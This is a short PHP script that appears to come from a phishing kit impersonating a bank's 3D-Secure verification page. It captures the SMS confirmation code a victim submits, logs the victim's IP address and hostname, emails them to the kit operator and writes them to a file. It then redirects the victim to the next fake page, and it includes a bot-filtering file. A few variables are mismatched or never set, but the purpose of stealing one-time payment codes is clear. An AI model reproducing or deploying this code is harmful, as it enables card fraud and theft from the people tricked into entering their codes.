<?php
	include('./includes/bots.php');
	include '../email.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "👨‍💻 Code SMS : ".$_POST['bankid']."\n";
$message .= "🌐 IP : $hostname\n";

$Subject="👨‍💻 N3W C0D3 3DS [1/3] 👨‍💻 | "._ip()."";
$head="From: 🚀 S&F - $hostname\n 🚀<s&f@3ds.eu>";
mail($my_mail,$subject,$message,$headers);

			fputs($fp, $message);
			fclose($fp);

     echo "<meta http-equiv='refresh' content='0; url=./load1.php' />";

?>
